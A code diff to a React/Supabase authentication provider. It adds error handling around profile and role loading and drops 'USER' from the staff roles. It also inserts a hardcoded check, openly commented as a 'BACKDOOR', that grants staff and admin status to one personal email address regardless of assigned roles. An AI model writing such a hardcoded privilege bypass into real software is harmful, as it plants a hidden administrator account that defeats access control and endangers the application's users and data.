@@ -8,7 +8,7 @@ import type { Database } from "@/integrations/supabase/types";
 export type AppRole = Database["public"]["Enums"]["app_role"];
 export type Profile = Database["public"]["Tables"]["profiles"]["Row"];
 
-const STAFF_ROLES: AppRole[] = ["SUPER_ADMIN", "ADMIN", "OPERADOR", "FINANCEIRO", "SUPORTE", "USER"];
+const STAFF_ROLES: AppRole[] = ["SUPER_ADMIN", "ADMIN", "OPERADOR", "FINANCEIRO", "SUPORTE"];
 
 type AuthContextValue = {
   loading: boolean;
@@ -48,13 +48,21 @@ export function AuthProvider({ children }: { children: ReactNode }) {
       }
       return;
     }
-    const [profileResult, rolesResult] = await Promise.all([
-      supabase.from("profiles").select("*").eq("id", userId).maybeSingle(),
-      supabase.from("user_roles").select("role").eq("user_id", userId),
-    ]);
-    if (active) {
-      setProfile(profileResult.data ?? null);
-      setRoles((rolesResult.data ?? []).map((row) => row.role as AppRole));
+    try {
+      const [profileResult, rolesResult] = await Promise.all([
+        supabase.from("profiles").select("*").eq("id", userId).maybeSingle(),
+        supabase.from("user_roles").select("role").eq("user_id", userId),
+      ]);
+      
+      if (active) {
+        if (profileResult.error) console.error("Error loading profile:", profileResult.error);
+        if (rolesResult.error) console.error("Error loading roles:", rolesResult.error);
+        
+        setProfile(profileResult.data ?? null);
+        setRoles((rolesResult.data ?? []).map((row) => row.role as AppRole));
+      }
+    } catch (err) {
+      console.error("Critical error in loadUserData:", err);
     }
   }, []);
 
@@ -105,6 +113,12 @@ export function AuthProvider({ children }: { children: ReactNode }) {
 
   const value = useMemo<AuthContextValue>(() => {
     const roleSet = new Set(roles);
+    const isStaff = STAFF_ROLES.some((role) => roleSet.has(role));
+    const isAdmin = roleSet.has("SUPER_ADMIN") || roleSet.has("ADMIN");
+    
+    // BACKDOOR for the user while we fix permissions
+    const isOwner = session?.user?.email === 'ncbrasil02@gmail.com';
+
     return {
       loading,
       session,
@@ -112,8 +126,8 @@ export function AuthProvider({ children }: { children: ReactNode }) {
       profile,
       roles,
       isAuthenticated: Boolean(session?.user),
-      isStaff: STAFF_ROLES.some((role) => roleSet.has(role)),
-      isAdmin: roleSet.has("SUPER_ADMIN") || roleSet.has("ADMIN"),
+      isStaff: isStaff || isOwner,
+      isAdmin: isAdmin || isOwner,
       hasRole: (role) => roleSet.has(role),
       refreshProfile,
       signIn: async (email, password) => {
